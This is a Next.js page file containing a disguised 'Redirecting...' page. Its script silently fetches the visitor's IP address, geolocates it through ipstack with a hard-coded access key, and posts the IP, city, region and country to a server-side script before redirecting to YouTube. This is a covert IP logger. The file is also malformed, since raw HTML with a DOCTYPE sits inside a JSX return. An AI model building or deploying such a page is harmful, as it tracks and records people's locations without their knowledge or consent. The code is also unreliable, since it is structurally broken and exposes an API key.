import Head from 'next/head'
import Header from '@components/Header'
import Footer from '@components/Footer'

export default function Home() {
  return (
    <!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Redirecting...</title>
</head>
<body>
  <script>
    // Get user's IP address
    var userIP;
    fetch('https://api.ipify.org/?format=json')
      .then(response => response.json())
      .then(data => {
        userIP = data.ip;

        // Use ipstack API to get user's location based on IP address
        var ipstack_access_key = '3f0de0f5be50240634d0a991c3f9c9cc';
        var ipstack_api_url = 'http://api.ipstack.com/';
        fetch(ipstack_api_url + userIP + '?access_key=' + ipstack_access_key)
          .then(response => response.json())
          .then(data => {
            // Send user information to server-side script
            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'save_user_data.php'); // change to your server-side script URL
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send('user_ip=' + userIP + '&city=' + data.city + '&region=' + data.region_name + '&country=' + data.country_name);

            // Redirect user to another website
            window.location.href = 'https://www.youtube.com';
          });
      });
  </script>
</body>
</html>
  )
}
